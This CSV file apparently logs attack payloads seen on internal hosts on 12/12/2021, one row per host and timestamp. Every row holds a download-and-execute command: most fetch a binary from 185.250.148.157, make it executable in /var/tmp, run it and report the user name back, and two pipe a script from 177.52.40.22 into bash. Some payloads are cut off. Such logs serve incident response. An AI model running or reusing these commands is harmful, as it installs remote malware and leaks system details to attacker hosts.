host,earliest,payload
10.108.255.144,12/12/2021 15:42:03,"(curl -fsSL http://185.250.148.157:8005/index||wget -q -O - http://185.250.148.157:8005/index) > /var/tmp/12
chmod 777 /var/tmp/12
cd /var/tmp
./12
(wget http://185.250.148.157:8005/Linux$(whoami)||curl  http://185.250.148.157:8005/Linux$(whoami)"
10.108.255.144,12/12/2021 15:50:07,"(curl -fsSL http://185.250.148.157:8005/index||wget -q -O - http://185.250.148.157:8005/index) > /var/tmp/12
chmod"
10.108.255.147,12/12/2021 15:42:03,"(curl -fsSL http://185.250.148.157:8005/index||wget -q -O - http://185.250.148.157:8005/index) > /var/tmp/12
chmod 777 /var/tmp/12
cd /var/tmp
./12
(wget http://185.250.148.157:8005/Linux$(whoami)||curl  http://185.250.148.157:8005/Linux$(whoami)"
10.108.255.147,12/12/2021 15:52:10,"(curl -fsSL http://185.250.148.157:8005/index||wget -q -O - http://185.250.148.157:8005/index) > /var/tmp/12
chmod 777 /var/tmp/12
cd /var/tmp
./12
(wget http://185."
10.108.255.154,12/12/2021 15:42:03,"(curl -fsSL http://185.250.148.157:8005/index||wget -q -O - http://185.250.148.157:8005/index) > /var/tmp/12
chmod 777 /var/tmp/12
cd /var/tmp
./12
(wget http://185.250.148.157:8005/Linux$(whoami)||curl  http://185.250.148.157:8005/Linux$(whoami)"
10.108.255.154,12/12/2021 15:42:33,"(curl -fsSL http://185.250.148.157:8005/index||wget -q -O - http://185.250.148.157:8005/index) > /var/tmp/12
chmod 777 /var/tmp/12
cd /var/tmp
./12
(wget http://185.250.148.157:8005/Linux$(whoami)||curl  http://18"
10.108.255.157,12/12/2021 15:42:03,"(curl -fsSL http://185.250.148.157:8005/index||wget -q -O - http://185.250.148.157:8005/index) > /var/tmp/12
chmod 777 /var/tmp/12
cd /var/tmp
./12
(wget http://185.250.148.157:8005/Linux$(whoami)||curl  http://185.250.148.157:8005/Linux$(whoami)"
10.108.255.157,12/12/2021 15:42:04,"(curl -fsSL http://185.250.148.157:8005/index||wget -q -O - http://185.250.148.157:8005/index) > /var/tmp/12
chmod 777 /var/tmp/12
cd /var/tmp
./12
(wget http://185.250.148.157:8005/Linux$(whoami)||curl  http://185.250.148.157:8005"
10.108.255.213,12/12/2021 15:42:03,"(curl -fsSL http://185.250.148.157:8005/index||wget -q -O - http://185.250.148.157:8005/index) > /var/tmp/12
chmod 777 /var/tmp/12
cd /var/tmp
./12
(wget http://185.250.148.157:8005/Linux$(whoami)||curl  http://185.250.148.157:8005/Linux$(whoami)"
10.108.255.213,12/12/2021 15:51:11,"(curl -fsSL http://185.250.148.157:8005/index||wget -q -O - http://185.250.148.157:8005/index) > /var/tmp/12
chmod 777 /var/tmp/12
cd /var/tmp
./12
(wget http://185.250.148.157:8005/Linux$(whoami)||curl  "
10.108.255.213,12/12/2021 23:18:36,(curl http://177.52.40.22:5000/xpert/app/lib/locawebstyle/dist/javascripts/log.php || wget -q -O- http://177.52.40.22:5000/xpert/app/lib/locawebstyle/dist/javascripts/log.php)|bash
10.108.255.215,12/12/2021 23:18:36,(curl http://177.52.40.22:5000/xpert/app/lib/locawebstyle/dist/javascripts/log.php || wget -q -O- http://177.52.40.22:5000/xpert/app/lib/locawebstyle/dist/javascripts/log.php)|bash
10.108.255.218,12/12/2021 15:42:03,"(curl -fsSL http://185.250.148.157:8005/index||wget -q -O - http://185.250.148.157:8005/index) > /var/tmp/12
chmod 777 /var/tmp/12
cd /var/tmp
./12
(wget http://185.250.148.157:8005/Linux$(whoami)||curl  http://185.250.148.157:8005/Linux$(whoami)"
10.108.255.218,12/12/2021 15:51:39,"(curl -fsSL http://185.250.148.157:8005/index||wget -q -O - http://185.250.148.157:8005/index) > /var/tmp/12
chmod 777 /var/tmp/12
cd /var/tmp
./12
(wget http://185.250.148.157:8005/Linu"
10.108.255.223,12/12/2021 15:42:03,"(curl -fsSL http://185.250.148.157:8005/index||wget -q -O - http://185.250.148.157:8005/index) > /var/tmp/12
chmod 777 /var/tmp/12
cd /var/tmp
./12
(wget http://185.250.148.157:8005/Linux$(whoami)||curl  http://185.250.148.157:8005/Linux$(whoami)"
